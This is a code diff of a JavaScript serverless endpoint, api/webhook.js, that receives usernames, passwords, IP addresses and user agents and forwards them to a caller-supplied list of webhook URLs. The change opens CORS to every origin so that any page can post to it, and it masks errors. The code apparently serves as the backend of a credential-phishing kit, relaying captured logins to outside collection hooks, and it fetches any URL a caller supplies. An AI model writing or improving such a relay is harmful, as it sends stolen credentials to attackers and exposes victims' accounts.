@@ -1,6 +1,18 @@
-// api/webhook.js
 export default async function handler(req, res) {
-  // Only allow POST requests
+  // Enable CORS
+  res.setHeader('Access-Control-Allow-Credentials', true);
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
+  res.setHeader(
+    'Access-Control-Allow-Headers',
+    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
+  );
+
+  if (req.method === 'OPTIONS') {
+    res.status(200).end();
+    return;
+  }
+
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
@@ -8,7 +20,6 @@ export default async function handler(req, res) {
   try {
     const { webhooks, username, password, uid, userAgent, ip } = req.body;
 
-    // Validate required fields
     if (!webhooks || !Array.isArray(webhooks) || webhooks.length === 0) {
       return res.status(400).json({ error: 'No webhooks provided' });
     }
@@ -17,7 +28,6 @@ export default async function handler(req, res) {
       return res.status(400).json({ error: 'Username and password required' });
     }
 
-    // Prepare payload
     const payload = {
       uid: uid || 'unknown',
       username: username,
@@ -27,26 +37,31 @@ export default async function handler(req, res) {
       ip: ip || 'unknown'
     };
 
-    // Send to all webhooks
     const results = await Promise.allSettled(
       webhooks.map(async (webhook) => {
-        const response = await fetch(webhook, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(payload)
-        });
-
-        return {
-          webhook: webhook,
-          status: response.status,
-          ok: response.ok
-        };
+        try {
+          const response = await fetch(webhook, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+          });
+          return {
+            webhook: webhook,
+            status: response.status,
+            ok: response.ok
+          };
+        } catch (error) {
+          return {
+            webhook: webhook,
+            ok: false,
+            error: error.message
+          };
+        }
       })
     );
 
-    // Count successes and failures
     const succeeded = results.filter(r => r.status === 'fulfilled' && r.value?.ok).length;
     const failed = results.filter(r => r.status === 'rejected' || !r.value?.ok).length;
 
@@ -56,7 +71,7 @@ export default async function handler(req, res) {
       total: webhooks.length,
       succeeded: succeeded,
       failed: failed,
-      results: results.map(r => r.status === 'fulfilled' ? r.value : { error: r.reason })
+      results: results.map(r => r.status === 'fulfilled' ? r.value : { error: 'Failed' })
     });
 
   } catch (error) {
